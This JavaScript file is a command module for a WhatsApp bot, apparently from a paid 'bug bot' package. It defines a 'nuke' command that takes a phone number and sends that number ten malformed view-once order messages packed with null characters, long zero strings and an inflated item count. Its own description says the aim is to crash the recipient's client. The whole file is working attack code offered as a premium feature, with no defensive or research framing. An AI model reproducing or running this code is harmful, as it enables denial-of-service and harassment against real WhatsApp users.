import { isPremiumUser } from '../../utils/premiumStore.js';
export default {
    name: 'nuke', aliases: ['totalcrash', 'fullcrash'], category: 'bug',
    description: 'Full nuclear crash - all attacks combined', usage: 'nuke <number>', cooldown: 60, ownerOnly: true,
    async execute({ sock, message, args, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        const num = args[0]?.replace(/[^0-9]/g, ''); if (!num) return sock.sendMessage(from, { text: '❌ Usage: .nuke <number>' }, { quoted: message });
        const t = `${num}@s.whatsapp.net`;
        await sock.sendMessage(from, { react: { text: '☢️', key: message.key } });
        await sock.sendMessage(from, { text: '☢️ NUKING ' + num }, { quoted: message });
        try {
            for (let i = 0; i < 10; i++) {
                await sock.relayMessage(t, { viewOnceMessage: { message: { orderMessage: { orderId: "0".repeat(1000), itemCount: 99999, status: "INQUIRY", surface: "BUFFERS", message: "\u0000".repeat(500), orderTitle: "\u0000".repeat(500), sellerJid: t, token: "\u0000".repeat(500) }, messageContextInfo: { deviceListMetadata: {} } } } }, { participant: { jid: t } });
                await new Promise(r => setTimeout(r, 100));
            }
            await sock.sendMessage(from, { text: '✅ Nuked' }, { quoted: message });
        } catch (e) { await sock.sendMessage(from, { text: '❌ ' + e.message }, { quoted: message }); }
        await sock.sendMessage(from, { react: { text: '✅', key: message.key } });
    }
};
